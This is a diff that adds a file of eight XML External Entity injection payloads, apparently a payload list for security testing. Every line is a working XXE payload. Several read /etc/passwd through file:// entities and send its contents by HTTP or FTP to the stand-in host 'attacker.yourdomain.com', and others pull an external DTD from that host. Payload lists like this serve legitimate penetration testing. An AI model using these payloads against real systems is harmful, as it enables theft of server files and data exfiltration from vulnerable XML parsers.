@@ -1,0 +1,8 @@
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.yourdomain.com/xxe"> %xxe; ]>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.yourdomain.com/xxe.dtd"> %xxe; ]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.yourdomain.com/file"> ]><foo>&xxe;</foo>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "ftp://attacker.yourdomain.com/file"> ]><foo>&xxe;</foo>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> <!ENTITY send SYSTEM "http://attacker.yourdomain.com/?data=&xxe;"> ]><foo>&send;</foo>
+<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://attacker.yourdomain.com/evil.dtd"> %dtd; ]>
+<!DOCTYPE foo [ <!ENTITY % data SYSTEM "file:///etc/passwd"> <!ENTITY % param1 "<!ENTITY exfiltrate SYSTEM 'http://attacker.yourdomain.com/?data=%data;'>"> %param1; ]><foo>&exfiltrate;</foo>
+<!DOCTYPE foo [ <!ENTITY % start "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.yourdomain.com/?data="> <!ENTITY % end "'>"> <!ENTITY % dtd SYSTEM "http://attacker.yourdomain.com/evil.dtd"> %start; %end; %dtd; ]>
